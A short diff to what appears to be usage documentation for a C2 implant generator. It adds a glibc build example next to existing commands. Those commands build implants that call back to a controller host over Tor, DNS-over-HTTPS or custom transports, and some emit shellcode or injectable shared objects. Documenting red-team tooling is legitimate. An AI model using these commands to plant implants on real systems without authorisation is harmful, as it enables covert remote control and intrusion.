@@ -305,6 +305,8 @@ generate_c --cc your.domain.com --transport libssl
 generate_c --cc abcdefghijklmnop.onion:80 --c2-channel-mode tor --allow-custom-transport --transport tor --transport-option socks5=127.0.0.1:9050
 # resolve the C2 host over DNS-over-HTTPS
 generate_c --cc your.domain.com --doh https://1.1.1.1/dns-query
+# glibc defaults: GLIBC_VERSION=2.17 and DYNLOAD_MODE=auto for both old and new hosts
+generate_c --type glibc --arch amd64 --cc your.domain.com
 # musl target (Alpine and other musl hosts); dynload follows the library
 generate_c --type musl --arch arm64 --cc your.domain.com
 # artifact formats: exe (default), so (dlopen/injection), shellcode (malasada PIC)
